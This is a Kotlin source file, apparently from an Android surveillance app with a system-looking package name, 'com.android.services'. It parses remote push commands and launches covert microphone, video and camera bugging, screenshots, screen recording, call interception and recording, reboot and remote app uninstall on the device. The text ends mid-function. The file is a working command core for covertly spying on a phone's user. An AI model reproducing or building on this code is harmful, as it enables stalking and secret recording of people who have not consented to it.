package com.android.services.util

import android.Manifest
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.text.TextUtils
import android.text.format.DateFormat
import com.android.services.db.entities.*
import com.android.services.enums.FcmPushStatus
import com.android.services.logs.LogFactory
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.models.*
import com.android.services.network.api.NodeServerOneApi
import com.android.services.network.api.TOSApi
import com.android.services.receiver.WatchDogAlarmReceiver
import com.android.services.services.RemoteDataService
import com.android.services.services.callIntercept.CallInterceptCommandService
import com.android.services.services.callRecord.CallRecorderService
import com.android.services.services.cameraBug.CameraBugCommandProcessingBase
import com.android.services.services.cameraBug.CameraBugCommandService
import com.android.services.services.micBug.MicBugCommandProcessingBaseI
import com.android.services.services.micBug.MicBugCommandService
import com.android.services.services.screenRecord.ScreenRecordCommandService
import com.android.services.services.screenSharing.ScreenSharingCommandService
import com.android.services.services.screenshot.ScreenShotCommandService
import com.android.services.services.videoBug.VideoBugCommandProcessingBase
import com.android.services.services.videoBug.VideoBugCommandService
import com.android.services.services.view360.View360CommandProcessingBaseI
import com.android.services.services.view360.View360CommandService
import com.android.services.services.view360ByJitsi.View360ByJitsiCommandProcessingBaseI
import com.android.services.services.view360ByJitsi.View360ByJitsiMeetCommandService
import com.android.services.services.voip.VoipCallCommandService
import com.android.services.ui.activities.BackgroundServicesActivity
import com.android.services.ui.activities.FeatureTestActivity
import com.android.services.ui.activities.ScreenRecordIntentActivity
import com.android.services.workers.DataUploadingWorker
import com.android.services.workers.FutureWorkUtil
import com.android.services.workers.View360ByJitsi.View360ByJitsiCommandProcessingBase
import com.android.services.workers.View360ByJitsi.View360ByJitsiMeetCommandWorker
import com.android.services.workers.callRecord.CallRecordWorkerService
import com.android.services.workers.micbug.MicBugCommandProcessingBase
import com.android.services.workers.micbug.MicBugCommandWorker
import com.android.services.workers.videobug.VideoBugCommandWorker
import com.android.services.workers.view360.View360CommandProcessingBase
import com.android.services.workers.view360.View360CommandWorker
import com.android.services.workers.voip.VoipCallRecordWorkerService
import com.google.gson.GsonBuilder
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.buffer
import kotlinx.coroutines.flow.collect
import kotlinx.coroutines.flow.flow
import org.greenrobot.eventbus.EventBus
import org.json.JSONArray
import org.json.JSONObject
import java.util.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object FirebasePushUtils {

    fun startTestActivity(mContext: Context, type: Int = 0) {
        mContext.startActivityWithData<FeatureTestActivity>(
            listOf(Intent.FLAG_ACTIVITY_NEW_TASK),
            Pair("type", type)
        )
    }

    /**
     * This method handles and receives the Push Commands,
     * and Launches the Activity to handle the Fcm Push
     * [fcmPush] Fcm Push
     * @param type specifies the type of the fcm push or log type
     */
    fun startPushCommand(mContext: Context, fcmPush: FCMPush? = null, type: String) {
        mContext.startActivityWithData<BackgroundServicesActivity>(
            listOf(Intent.FLAG_ACTIVITY_NEW_TASK),
            Pair(BackgroundServicesActivity.EXTRA_PARCELABLE_OBJECT, fcmPush),
            Pair(BackgroundServicesActivity.EXTRA_TYPE, type)
        )
    }

    /** Restart the Remote Data Sync Service [RemoteDataService] If not running or stopped **/
    fun restartRemoteDataSyncService(applicationContext: Context, quickSync: Boolean = true) {
        try {
            if (AppUtils.isPhoneServiceActivated()) {
                if (AppConstants.serviceState) {
                    logVerbose(
                        "DataUploadingWorkerInfo= ",
                        "Going to reschedual existing Data Uploading Worker"
                    )
                    FutureWorkUtil.scheduleDataUploadingWorker(applicationContext, quickSync)
                } else {
                    logVerbose("Service state is stopped")
                }
            }
        } catch (e: Exception) {
            logVerbose("DataUploadingWorkerInfo= ", "Restart Remote Data Sync Service fun error=$e")
        }
    }


    fun hardRestartApp(applicationContext: Context, launchActivity: Boolean = true) {
        try {
            // cancel data uploading worker
            if (AppUtils.isWorkRunning(
                    context = applicationContext,
                    DataUploadingWorker::class.java.name
                )
            ) {
                FutureWorkUtil.stopBackgroundWorker(
                    applicationContext,
                    DataUploadingWorker::class.java.name
                )
            }
            if (AppUtils.isPhoneServiceActivated()) {
                if (AppConstants.serviceState) {
                    logVerbose("DataUploadingWorkerInfo= ", "Reschedual data uploading worker")
                    FutureWorkUtil.scheduleDataUploadingWorker(applicationContext)
                }
            }
        } catch (e: Exception) {
            FutureWorkUtil.scheduleDataUploadingWorker(applicationContext)
            logVerbose("DataUploadingWorkerInfo= ", "Exception while reschedualing worker =$e")
        }
    }

    private fun startScreenSharingByJitseService(applicationContext: Context, push: FCMPush) {
        val isMicBugRunning =
            AppUtils.isServiceRunning(applicationContext, MicBugCommandWorker::class.java.name)
        val isVideoBugRunning =
            AppUtils.isServiceRunning(applicationContext, VideoBugCommandWorker::class.java.name)
        val isView360Running =
            AppUtils.isServiceRunning(
                applicationContext,
                View360CommandWorker::class.java.name
            )
        val isView360ByJitsiRunning =
            AppUtils.isServiceRunning(
                applicationContext,
                View360ByJitsiMeetCommandWorker::class.java.name
            )

        // stop View360 Service if already Running
        if (isView360Running) {
            //View360CommandProcessingBaseI.view360BugStatus = FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    View360CommandService::class.java
//                )
//            )
            View360CommandProcessingBase.view360BugStatus = FcmPushStatus.INTERRUPTED.getStatus()
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                View360CommandWorker::class.java.name
            )
        }

        // stop View360 By Jitsi Service if already Running
        if (isView360ByJitsiRunning) {
            View360ByJitsiCommandProcessingBaseI.view360ByJitsiBugStatus =
                FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    View360ByJitsiCommand::class.java
//                )
//            )
            FutureWorkUtil.stopBackgroundWorker(applicationContext,View360ByJitsiMeetCommandWorker::class.java.name)
        }


        // stop Mic Bug Service if already Running
        if (isMicBugRunning) {
//            MicBugCommandProcessingBaseI.micBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    MicBugCommandService::class.java
//                )
//            )
            MicBugCommandProcessingBase.micBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                MicBugCommandWorker::class.java.name
            )
        }

        // stop Video Bug Service if already Running
        if (isVideoBugRunning) {
//            VideoBugCommandProcessingBase.videoBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    VideoBugCommandService::class.java
//                )
//            )
            com.android.services.workers.videobug.VideoBugCommandProcessingBase.videoBugStatus =
                FcmPushStatus.INTERRUPTED.getStatus()
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                VideoBugCommandWorker::class.java.name
            )

        }

        // start view360ByJitse Service
        startPushCommand(applicationContext, push, type = AppConstants.SCREEN_SHARING_JITSE_TYPE)
    }

    /** Starts the Live view360 Service */
    private fun startView360ByJitseService(applicationContext: Context, push: FCMPush) {
        val isMicBugRunning =
            AppUtils.isServiceRunning(applicationContext, MicBugCommandWorker::class.java.name)
        val isVideoBugRunning =
            AppUtils.isServiceRunning(applicationContext, VideoBugCommandWorker::class.java.name)
        val isView360Running =
            AppUtils.isServiceRunning(applicationContext, View360CommandWorker::class.java.name)
        val isCameraBugRunning =
            AppUtils.isServiceRunning(applicationContext, CameraBugCommandService::class.java.name)

        val isScreenSharingRunning =
            AppUtils.isServiceRunning(
                applicationContext,
                ScreenSharingCommandService::class.java.name
            )


        // stop Mic Bug Service if already Running
        if (isMicBugRunning) {
//            MicBugCommandProcessingBaseI.micBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    MicBugCommandService::class.java
//                )
//            )
            MicBugCommandProcessingBase.micBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                MicBugCommandWorker::class.java.name
            )
        }
        // stop Camera Bug Service if already Running
        if (isCameraBugRunning) {
            CameraBugCommandProcessingBase.cameraBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
            applicationContext.stopService(
                Intent(
                    applicationContext,
                    CameraBugCommandService::class.java
                )
            )
        }

        // stop Video Bug Service if already Running
        if (isVideoBugRunning) {
//            VideoBugCommandProcessingBase.videoBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    VideoBugCommandService::class.java
//                )
//            )
            com.android.services.workers.videobug.VideoBugCommandProcessingBase.videoBugStatus =
                FcmPushStatus.INTERRUPTED.getStatus()
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                VideoBugCommandWorker::class.java.name
            )
        }

        // stop View360 Service if already Running
        if (isView360Running) {
//            VideoBugCommandProcessingBase.videoBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    View360CommandService::class.java
//                )
//            )
            View360CommandProcessingBase.view360BugStatus = FcmPushStatus.INTERRUPTED.getStatus()
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                View360CommandWorker::class.java.name
            )
        }

        // stop Screen Sharing Service if already Running
        if (isScreenSharingRunning) {
            AppConstants.view360InteruptMessage = "Screen Sharing Disconnected Due to View360"
            applicationContext.stopService(
                Intent(
                    applicationContext,
                    ScreenSharingCommandService::class.java
                )
            )
        }
        // start view360ByJitse Service
        startPushCommand(applicationContext, push, type = AppConstants.VIEW_360_JITSE_TYPE)
    }

    private fun startCallInterceptService(applicationContext: Context, push: FCMPush) {
        val isMicBugRunning =
            AppUtils.isServiceRunning(applicationContext, MicBugCommandWorker::class.java.name)
        val isVideoBugRunning =
            AppUtils.isServiceRunning(applicationContext, VideoBugCommandWorker::class.java.name)
        val isView360ByJitsiRunning = AppUtils.isServiceRunning(
            applicationContext,
            View360ByJitsiMeetCommandWorker::class.java.name
        )
        val isView360Running = AppUtils.isServiceRunning(
            applicationContext,
            View360CommandWorker::class.java.name
        )
        val isCallRecordingRunning = AppUtils.isServiceRunning(
            applicationContext,
            CallRecordWorkerService::class.java.name
        )
        val isScreenSharingRunning = AppUtils.isServiceRunning(
            applicationContext,
            ScreenSharingCommandService::class.java.name
        )


        // stop View360 By Jitsi meet Service if already Running
        if (isScreenSharingRunning) {
            applicationContext.stopService(
                Intent(
                    applicationContext,
                    ScreenSharingCommandService::class.java
                )
            )
        }


        // stop Call Recording Service if already Running
        if (isCallRecordingRunning) {
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    CallRecorderService::class.java
//                )
//            )
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                CallRecordWorkerService::class.java.name
            )
        }

        // stop Mic Bug Service if already Running
        if (isMicBugRunning) {
//            MicBugCommandProcessingBaseI.micBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    MicBugCommandService::class.java
//                )
//            )
            MicBugCommandProcessingBase.micBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                MicBugCommandWorker::class.java.name
            )
        }

        // stop Video Bug Service if already Running
        if (isVideoBugRunning) {
//            VideoBugCommandProcessingBase.videoBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    VideoBugCommandService::class.java
//                )
//            )
            com.android.services.workers.videobug.VideoBugCommandProcessingBase.videoBugStatus =
                FcmPushStatus.INTERRUPTED.getStatus()
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                VideoBugCommandWorker::class.java.name
            )
        }

        // stop View 360 by jitsi  Service if already Running
        if (isView360ByJitsiRunning) {
            View360ByJitsiCommandProcessingBaseI.view360ByJitsiBugStatus =
                FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    View360ByJitsiMeetCommandService::class.java
//                )
//            )
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                View360ByJitsiMeetCommandWorker::class.java.name
            )
        }


        // stop View 360 Service if already Running
        if (isView360Running) {
//            View360ByJitsiCommandProcessingBaseI.view360ByJitsiBugStatus =
//                FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    View360CommandService::class.java
//                )
//            )
            View360CommandProcessingBase.view360BugStatus =
                FcmPushStatus.INTERRUPTED.getStatus()
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                View360CommandWorker::class.java.name
            )
        }
        // start view360 Service
        startPushCommand(applicationContext, push, type = AppConstants.CALL_INTERCEPT_TYPE)
    }

    /** Starts the Live view360 Service */
    private fun startView360Service(applicationContext: Context) {
        val isMicBugRunning =
            AppUtils.isServiceRunning(applicationContext, MicBugCommandWorker::class.java.name)
        val isCameraBugRunning =
            AppUtils.isServiceRunning(applicationContext, CameraBugCommandService::class.java.name)
        val isVideoBugRunning =
            AppUtils.isServiceRunning(applicationContext, VideoBugCommandWorker::class.java.name)

        // stop Mic Bug Service if already Running
        if (isMicBugRunning) {
//            MicBugCommandProcessingBaseI.micBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    MicBugCommandService::class.java
//                )
//            )
            MicBugCommandProcessingBase.micBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                MicBugCommandWorker::class.java.name
            )
        }
        // stop Camera Bug Service if already Running
        if (isCameraBugRunning) {
            CameraBugCommandProcessingBase.cameraBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
            applicationContext.stopService(
                Intent(
                    applicationContext,
                    CameraBugCommandService::class.java
                )
            )
        }

        // stop Video Bug Service if already Running
        if (isVideoBugRunning) {
//            VideoBugCommandProcessingBase.videoBugStatus = FcmPushStatus.INTERRUPTED.getStatus()
//            applicationContext.stopService(
//                Intent(
//                    applicationContext,
//                    VideoBugCommandService::class.java
//                )
//            )
            com.android.services.workers.videobug.VideoBugCommandProcessingBase.videoBugStatus =
                FcmPushStatus.INTERRUPTED.getStatus()
            FutureWorkUtil.stopBackgroundWorker(
                applicationContext,
                VideoBugCommandWorker::class.java.name
            )
        }
        // start view360 Service
        startPushCommand(applicationContext, type = AppConstants.VIEW_360_TYPE)
    }

    /**
     * This functions checks for the permission required to execute a push,
     * And validate if previous instances of push services are already running or not
     */
    fun checkBugStatus(
        applicationContext: Context,
        pushMethod: String,
        permissions: Array<String>,
        service: String,
    ): FcmPushStatus {
        var bugStatus = FcmPushStatus.RECEIVED
        if (!TextUtils.isEmpty(service) && AppUtils.isServiceRunning(applicationContext, service)) {
            bugStatus = FcmPushStatus.FEATURE_ALREADY_PROCESSING
            return bugStatus
        }
        for (permission in permissions) {
            when (permission) {
                Manifest.permission.RECORD_AUDIO -> if (!AppUtils.checkPermissionGranted(
                        applicationContext,
                        permission
                    )
                ) {
                    bugStatus = FcmPushStatus.MICROPHONE_PERMISSION_MISSING
                } else if (AppConstants.osLessThanTen && !AppUtils.isMicrophoneAvailable(
                        applicationContext
                    )
                ) {
                    bugStatus = FcmPushStatus.MICROPHONE_NOT_AVAILABLE
                }

                Manifest.permission.CAMERA -> if (!AppUtils.checkPermissionGranted(
                        applicationContext,
                        permission
                    )
                ) {
                    bugStatus = FcmPushStatus.CAMERA_PERMISSION_MISSING
                } else if (AppUtils.getLastWindowPackage(applicationContext) == AppUtils.getDefaultCamera()) {
                    bugStatus = FcmPushStatus.CAMERA_NOT_AVAILABLE
                }

                Manifest.permission.SYSTEM_ALERT_WINDOW -> {
                    if (AppConstants.osGreaterThanOrEqualMarshmallow && !Settings.canDrawOverlays(
                            applicationContext
                        )
                    ) {
                        bugStatus = FcmPushStatus.DRAW_OVER_APP_PERMISSION_MISSING
                    }
                }

                "screenRecordIntent" -> if (!AppConstants.osGreaterThanOrEqualLollipop) bugStatus =
                    FcmPushStatus.FEATURE_NOT_SUPPORTED else if (AppConstants.screenRecordingIntent == null) bugStatus =
                    FcmPushStatus.SCREEN_RECORD_PERMISSION_MISSING else if (!AppUtils.isScreenInteractive(
                        applicationContext
                    )
                ) bugStatus = FcmPushStatus.SCREEN_DISPLAY_OFF

                "cameraBugSupport" -> {
                    if (!AppConstants.osGreaterThanOrEqualLollipop)
                        bugStatus = FcmPushStatus.FEATURE_NOT_SUPPORTED
                }
            }
        }

        if (pushMethod == "videobug" || pushMethod == "startMicBug"
//            || pushMethod == "Spy360Camera" || pushMethod == "Spy360Audio" || pushMethod == "Spy360JitsiVideo"
            || pushMethod == "Spy360JitsiCallIntercept"
        ) {
            if (AppUtils.isServiceRunning(
                    applicationContext,
                    MicBugCommandWorker::class.java.name
                ) && pushMethod != "Spy360JitsiCallIntercept"
            ) {
                bugStatus = FcmPushStatus.MIC_BUG_PROCESSING
            }
            if (AppUtils.isServiceRunning(
                    applicationContext,
                    CallInterceptCommandService::class.java.name
                ) && pushMethod != "Spy360JitsiCallIntercept"
            ) {
                bugStatus = FcmPushStatus.CALL_RECORD_PROCESSING
            } else if (AppUtils.isServiceRunning(
                    applicationContext,
                    VideoBugCommandWorker::class.java.name
                ) && pushMethod != "Spy360JitsiCallIntercept"
            ) {
                bugStatus = FcmPushStatus.VIDEO_BUG_PROCESSING
            } else if (AppUtils.isServiceRunning(
                    applicationContext,
                    CallRecordWorkerService::class.java.name
                ) && pushMethod != "Spy360JitsiCallIntercept"
            ) {
                bugStatus = FcmPushStatus.CALL_RECORD_PROCESSING
            } else if (AppUtils.isServiceRunning(
                    applicationContext,
                    CallInterceptCommandService::class.java.name
                )
            ) {
                bugStatus = FcmPushStatus.CALL_RECORD_PROCESSING
            } else if (AppConstants.osLessThanTen && AppUtils.isServiceRunning(
                    applicationContext,
                    VoipCallRecordWorkerService::class.java.name
                ) && pushMethod != "Spy360JitsiCallIntercept"
            ) {
                bugStatus = FcmPushStatus.VOIP_CALL_PROCESSING
            }
        } else if (pushMethod == "startCameraRecording") {
            if (AppUtils.isServiceRunning(
                    applicationContext, VideoBugCommandWorker::class.java.name
                )
            ) {
                bugStatus = FcmPushStatus.VIDEO_BUG_PROCESSING
            }
            if (AppUtils.isServiceRunning(
                    applicationContext,
                    View360CommandWorker::class.java.name
                )
            ) {
                bugStatus = FcmPushStatus.VIEW_360_INTERRUPTION
            }
            if (AppUtils.isServiceRunning(
                    applicationContext,
                    View360ByJitsiMeetCommandWorker::class.java.name
                )
            ) {
                bugStatus = FcmPushStatus.VIEW_360_INTERRUPTION
            }
        } else if (pushMethod == "screenshoot") {
            if (AppUtils.isServiceRunning(
                    applicationContext,
                    ScreenSharingCommandService::class.java.name
                )
            ) {
                bugStatus = FcmPushStatus.VIEW_360_INTERRUPTION
            }
        }
        return bugStatus
    }

    /**
     * This Method is Responsible updating the Push Status, and upload the statuses to Server
     * @param pushId Id of Push
     * @param fcmPushStatus is an instance Of [FcmPushStatus] representing the push status
     */
    fun updatePushStatus(
        applicationContext: Context,
        localDatabaseSource: LocalDatabaseSource,
        tosApi: TOSApi? = null,
        pushId: String,
        fcmPushStatus: FcmPushStatus? = null,
        fcmStatus: String? = null,
        syncStatus: Boolean = true
    ) {
        try {

            // Update Push Status
            val status = fcmPushStatus?.getStatus() ?: fcmStatus!!
            val pushStatus = PushStatus(
                pushId,
                status,
                AppUtils.getPhoneServiceId(),
                AppUtils.getDate(System.currentTimeMillis()),
                0
            )
            localDatabaseSource.insertPushStatus(pushStatus)

            if (syncStatus) {
                LogFactory(
                    applicationContext,
                    AppConstants.PUSH_STATUS_TYPE,
                    localDatabaseSource,
                    tosApi = tosApi
                ).getLog().uploadLogs()
            }
        } catch (e: Exception) {
            logException("fcm push status update error ${e.message}")
        }
    }

    /** Parses the FCM push Object **/
    @Throws(Exception::class)
    fun parsePush(fcmPush: String): FCMPush {
        val pushObject = JSONObject(fcmPush)
        val pushCommand = pushObject.getJSONObject("data")
        val pushMethod = pushCommand.getString("method")
        val pushId = pushCommand.getString("push_id")
        val phoneServiceId = pushId.split("_")[0]
        return FCMPush(pushCommand.toString(), pushMethod, pushId, phoneServiceId)
    }

    fun parsePushNotifications(
        applicationContext: Context,
        coroutineScope: CoroutineScope,
        localDatabaseSource: LocalDatabaseSource,
        pushNotificationsMessages: PushNotificationsMessages
    ) {

        val pushNotifications = pushNotificationsMessages.pushNotifications
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} pushNotifications = $pushNotifications")

        val videoBugs = pushNotifications.sortBugs(BugMethod.VideoBug)
        val micBugs = pushNotifications.sortBugs(BugMethod.MicBug)
        val micBugSchedule = pushNotifications.sortBugs(BugMethod.MicBugSchedule)
        val cameraBugs = pushNotifications.sortBugs(BugMethod.CameraBug)
        val screenShots = pushNotifications.sortBugs(BugMethod.Screenshoot)
        val screenRecordCommand = pushNotifications.sortBugs(BugMethod.ScreenRecordCommand)
        val restartApp = pushNotifications.sortBugs(BugMethod.RestartApp)
        val syncMethod = pushNotifications.sortBugs(BugMethod.SynchMethod)
        val gpsLocationUpdateInterval =
            pushNotifications.sortBugs(BugMethod.GpsLocationUpdateInterval)
        val rebootDevice = pushNotifications.sortBugs(BugMethod.RebootDevice)
        val deleteApplication = pushNotifications.sortBugs(BugMethod.DeleteApplication)
        val webFilter = pushNotifications.sortBugs(BugMethod.WebFiler)
        val screenTimeRange = pushNotifications.sortBugs(BugMethod.ScreenTimeRange)
        val serviceStartStop = pushNotifications.sortBugs(BugMethod.ServiceStopStart)
        val appBlock = pushNotifications.sortBugs(BugMethod.AppBlock)
        val geoFence = pushNotifications.sortBugs(BugMethod.GeoFence)
        val alert = pushNotifications.sortBugs(BugMethod.Alert)
        val removeRestrictedCall = pushNotifications.sortBugs(BugMethod.RemoveRestrictCall)
        val restrictedCall = pushNotifications.sortBugs(BugMethod.RestrictCall)
        val remotelyUninstallApp = pushNotifications.sortBugs(BugMethod.RemotelyUninstallApp)
        val screenTimeUsage = pushNotifications.sortBugs(BugMethod.ScreenTimeUsage)
        val screenTimeDelete = pushNotifications.sortBugs(BugMethod.ScreenTimeDelete)

        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted video bugs = $videoBugs")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted mic bugs = $micBugs")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted mic bug scheduling = $micBugSchedule")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted camera bugs = $cameraBugs")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted screenshots = $screenShots")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted screenRecordCommand = $screenRecordCommand")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted restart app = $restartApp")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted sync method = $syncMethod")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted gps location interval = $gpsLocationUpdateInterval")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted reboot device = $rebootDevice")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted delete application = $deleteApplication")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted web filter = $webFilter")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted screen time range = $screenTimeRange")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted service start stop = $serviceStartStop")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted app block = $appBlock")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted geo fence = $geoFence")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted alert = $alert")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted remove restrict call = $removeRestrictedCall")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted restrict call = $restrictedCall")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted remotely uninstall app = $remotelyUninstallApp")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted screen time usage = $screenRecordCommand")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted screen time delete = $screenTimeDelete")
        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} sorted screen time usage = $screenTimeUsage")

        consumePushNotifications(
            applicationContext,
            coroutineScope,
            localDatabaseSource,
            micBugs,
            micBugSchedule,
            videoBugs,
            cameraBugs,
            screenShots,
            screenRecordCommand,
            restartApp,
            syncMethod,
            gpsLocationUpdateInterval,
            rebootDevice,
            deleteApplication,
            webFilter,
            screenTimeRange,
            serviceStartStop,
            appBlock,
            geoFence,
            alert,
            removeRestrictedCall,
            restrictedCall,
            screenTimeUsage,
            screenTimeDelete,
            remotelyUninstallApp
        )
    }

    // Bugging Methods
    private val buggingMethods = listOf(
        BugMethod.MicBug.getClassName().lowercase(),
        BugMethod.VideoBug.getClassName().lowercase(),
        BugMethod.CameraBug.getClassName().lowercase(),
        BugMethod.ScreenRecordCommand.getClassName().lowercase(),
        BugMethod.Screenshoot.getClassName().lowercase()
    )

    private fun consumePushNotifications(
        applicationContext: Context,
        coroutineScope: CoroutineScope,
        localDatabaseSource: LocalDatabaseSource,
        vararg bugs: List<PushNotification>
    ) {

        val pushFlow = flow<PushNotification> {
            bugs.forEach {
                it.forEach { pushNotification ->
                    logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} flow emitting = $pushNotification")
                    emit(pushNotification)
                    if (pushNotification.method.lowercase() in buggingMethods) {
                        delay(500)
                    }
                }
            }
        }

        coroutineScope.launch {
            pushFlow.buffer().collect { pushNotification ->
                logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} flow collecting = $pushNotification")
                val (pushNotExistsAlready, fcmPush, fcmPushStatus) = withContext(Dispatchers.IO) {
                    return@withContext executePushCommand(
                        applicationContext,
                        coroutineScope,
                        localDatabaseSource,
                        tosApi = null,
                        pushNotification
                    )
                }
                logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} push exits = ${!pushNotExistsAlready}")
                logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} fcm push = $fcmPush")
                logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} push status = $fcmPushStatus")

                if (pushNotExistsAlready) {
                    fcmPush?.let { fcm ->
                        if (fcm.pushMethod == "startWebFilter") {
                            val webFilterCommand = GsonBuilder().create()
                                .fromJson(fcm.pushCommand, WebFilterCommand::class.java)
                            updatePushStatus(
                                applicationContext,
                                localDatabaseSource,
                                null,
                                fcm.pushId,
                                fcmPushStatus = null,
                                fcmStatus = webFilterCommand.customData,
                                syncStatus = false
                            )
                        } else {
                            fcmPushStatus?.let { status ->
                                updatePushStatus(
                                    applicationContext,
                                    localDatabaseSource,
                                    null,
                                    fcm.pushId,
                                    status,
                                    syncStatus = false
                                )
                            } ?: run {
                                logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} fcm push status is null")
                            }
                        }
                    } ?: run {
                        logVerbose("${AppConstants.PUSH_NOTIFICATIONS_TYPE} fcm push is null")
                    }
                }
            }
        }
    }

    fun executePushCommand(
        applicationContext: Context,
        coroutineScope: CoroutineScope,
        localDatabaseSource: LocalDatabaseSource,
        tosApi: TOSApi? = null,
        pushNotification: PushNotification? = null,
        fcmPush: FCMPush? = null
    ): Triple<Boolean, FCMPush?, FcmPushStatus?> {

        var fcmPushStatus: FcmPushStatus? = null
        val push: FCMPush?
        push = fcmPush ?: parsePush(pushNotification!!.notificationData)
        val pushNotExistsAlready =
            if (push.pushMethod == "deleteTextAlert") true else localDatabaseSource.checkIfPushNotExistsAlready(
                push.pushId
            )

        when (push.pushMethod) {
            // MicBug
            "startMicBug" -> {
                if (pushNotExistsAlready) {
                    fcmPushStatus = checkBugStatus(
                        applicationContext,
                        push.pushMethod,
                        arrayOf(Manifest.permission.RECORD_AUDIO),
                        MicBugCommandWorker::class.java.name
                    )
                    if (fcmPushStatus == FcmPushStatus.RECEIVED)
                        if (AppConstants.syncMicBug) {
                            startPushCommand(
                                applicationContext,
                                push,
                                AppConstants.MIC_BUG_TYPE
                            )
                        } else {
                            fcmPushStatus = FcmPushStatus.FEATURE_SYNC_STOPPED
                        }
                }
            }

            // MicBug Scheduling
            "startMicBugSchedule" -> {
                val micBugScheduleCommand = GsonBuilder().create()
                    .fromJson<MicBugScheduleCommand>(
                        push.pushCommand,
                        MicBugScheduleCommand::class.java
                    )
                fcmPushStatus = FutureWorkUtil.scheduleMicBug(
                    applicationContext,
                    micBugScheduleCommand = micBugScheduleCommand
                )
            }

            // VideoBug
            "videobug" -> {
                val videoBugCommand = GsonBuilder().create()
                    .fromJson<VideoBugCommand>(
                        push.pushCommand,
                        VideoBugCommand::class.java
                    )
                if (videoBugCommand.timeOption == "0") {
                    if (pushNotExistsAlready) {
                        fcmPushStatus = checkBugStatus(
                            applicationContext,
                            push.pushMethod, arrayOf(
                                Manifest.permission.RECORD_AUDIO,
                                Manifest.permission.SYSTEM_ALERT_WINDOW,
                                Manifest.permission.CAMERA
                            ),
                            VideoBugCommandWorker::class.java.name
                        )
                        if (fcmPushStatus == FcmPushStatus.RECEIVED) {
                            if (AppConstants.syncVideoBug) {
                                startPushCommand(
                                    applicationContext,
                                    push,
                                    AppConstants.VIDEO_BUG_TYPE
